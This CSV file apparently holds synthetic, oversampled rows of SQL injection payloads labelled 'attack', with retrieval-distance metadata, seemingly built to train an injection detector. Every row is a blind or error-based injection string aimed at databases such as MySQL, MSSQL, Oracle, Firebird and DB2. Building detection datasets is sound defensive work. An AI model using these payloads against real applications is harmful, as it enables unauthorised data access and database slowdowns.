id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000001,attack,boolean,"1""   )    )    as ogzn where 6849  =  6849 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000024,0.8166580659700727
SMOTE_000002,attack,boolean,1   )    )     )   and 9575  =  1640--,nearest_attack_euclidean,R000037,1.284843279308775
SMOTE_000003,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and   (  ""yobb"" like ""yobb",nearest_attack_euclidean,R000039,0.8733907026101768
SMOTE_000004,attack,boolean,"1'||  (  select 'lxpg' where 7390  =  7390 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   ||'",nearest_attack_euclidean,R000059,1.0523138903203528
SMOTE_000005,attack,boolean,"1'+  (  select zukr where 9215  =  9215 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   +'",nearest_attack_euclidean,R000033,0.1934866969074665
SMOTE_000006,attack,boolean,"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'ugum' like 'ugum",nearest_attack_euclidean,R000053,3.576300559422375
SMOTE_000007,attack,boolean,"1%'   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   '%'  =  '",nearest_attack_euclidean,R000025,1.0358477293502193
SMOTE_000008,attack,boolean,"-8673""  )   or make_set  (  9354  =  9354,7185  )   and   (  ""edap"" like ""edap",nearest_attack_euclidean,R000050,1.3838061255061753
SMOTE_000009,attack,boolean,1'   )    )    and 2832  =  4165--,nearest_attack_euclidean,R000026,2.980659942858227
SMOTE_000010,attack,boolean,"-8327 where 7555  =  7555 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",nearest_attack_euclidean,R000035,2.4704696548697087
SMOTE_000011,attack,boolean,1'   )    )    and 2832  =  4165--,nearest_attack_euclidean,R000026,0.3793327378353081
SMOTE_000012,attack,boolean,"-2583""  )   where 3455  =  3455 or make_set  (  9354  =  9354,7185  )  --",nearest_attack_euclidean,R000047,0.285029694972474
SMOTE_000013,attack,boolean,"1"" or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ",nearest_attack_euclidean,R000073,0.5218730944163626
SMOTE_000014,attack,boolean,"1"" and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  ",nearest_attack_euclidean,R000023,0.9024974204380256
SMOTE_000015,attack,boolean,"1'+  (  select zukr where 9215  =  9215 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   +'",nearest_attack_euclidean,R000033,0.4365902882505227
SMOTE_000016,attack,boolean,"-7731""   )    )    or make_set  (  2551  =  4389,4389  )   and    (    (   ""unly"" like ""unly",nearest_attack_euclidean,R000022,0.07936893911339396
SMOTE_000017,attack,boolean,"1""  )   as jidc where 6093  =  6093 and 9198  =  9198--",nearest_attack_euclidean,R000055,2.451531265741509
SMOTE_000018,attack,boolean,1%'   )    )     )   and 1661  =  7683,nearest_attack_euclidean,R000010,1.571203612016352
SMOTE_000019,attack,boolean,"1'   )    )    and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'wzrj'  =  'wzrj",nearest_attack_euclidean,R000058,1.8291502091479075
SMOTE_000020,attack,boolean,"1%'   )    )    or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R000048,1.4050955718481153
SMOTE_000021,attack,boolean,-4873'   )    )     )   or 3038  =  3038,nearest_attack_euclidean,R000054,1.112084875783181
SMOTE_000022,attack,boolean,1%'   )    )     )   and 1661  =  7683,nearest_attack_euclidean,R000010,1.4856876954631069
SMOTE_000023,attack,boolean,"1'  )   and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000051,1.1591177770187386
SMOTE_000024,attack,boolean,"-9462""  )   as vzga where 4799  =  4799 or 8691  =  1048",nearest_attack_euclidean,R000077,0.8474367342046111
SMOTE_000025,attack,boolean,"1"" where 2642  =  2642 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000066,0.20800490051890122
